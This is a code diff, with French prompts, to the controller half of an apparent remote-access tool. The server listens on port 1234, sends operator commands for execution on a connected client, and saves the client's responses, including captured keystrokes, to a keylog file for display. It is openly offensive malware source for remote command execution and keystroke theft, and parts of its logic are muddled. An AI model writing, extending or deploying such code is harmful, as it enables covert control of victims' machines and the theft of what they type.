@@ -3,19 +3,30 @@ import threading
 
 ip_address = '0.0.0.0'
 port_number = 1234
+keylog_file = "keylog_client.txt"
 
 def handle_connection(connection, address):
     print(f"Connexion établie avec {address}")
+
     while True:
         try:
-            command = input("Entrer une commande à exécuter ('keylog' pour récupérer les frappes clavier) : ")
+            command = input("Entrer une commande à exécuter ('quit' pour terminer, 'keylog' pour afficher les frappes) : ")
             if command.lower() == 'quit':
                 connection.send(b'quit')
                 break
-            connection.send(command.encode())
+            elif command.lower() == 'keylog':
+                with open(keylog_file, "r") as keylog:
+                    print(f"Contenu du Keylogger:\n{keylog.read()}")
+            else:
+                connection.send(command.encode())
 
             response = connection.recv(4096).decode()
-            print(f"Output:\n{response}")
+            if not response:
+                break
+
+            with open(keylog_file, "a") as keylog:
+                keylog.write(response + "\n")
+
         except Exception as e:
             print(f"Error: {e}")
             break
